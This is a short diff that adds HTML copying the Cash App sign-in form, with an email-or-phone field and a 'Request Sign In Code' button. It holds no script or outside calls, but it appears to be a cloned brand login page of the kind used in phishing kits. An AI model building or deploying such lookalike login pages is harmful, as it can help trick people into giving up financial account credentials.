@@ -1,0 +1,11 @@
+<div class="login-container flex-container flex-v-center flex-fill">
+<!---->      <h1 class="step-title flex-static">Sign in to Cash&nbsp;App</h1>
+<!----><form autocomplete="off" spellcheck="true" novalidate="true" id="ember344" class="login-form ember-view">        <div id="ember370" class="field fk-field-container ember-view"><input type="text" aria-label="Email or Mobile Number" name="alias" autocomplete="off" spellcheck="false" autocapitalize="none" id="alias" class="ember-text-field ember-view" placeholder="Email or Mobile Number">
+</div>
+<!---->
+        <div class="alias-submit fade-in immediate ">
+          <div id="ember385" class="cta submit-button-component submit-button-with-spinner ember-view"><button type="submit" aria-label="Request Sign In Code" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-386="386">Request Sign In Code</button>
+  <div id="ember391" class="spinner-container ember-view"></div>
+</div>
+        </div>
+</form>  </div>
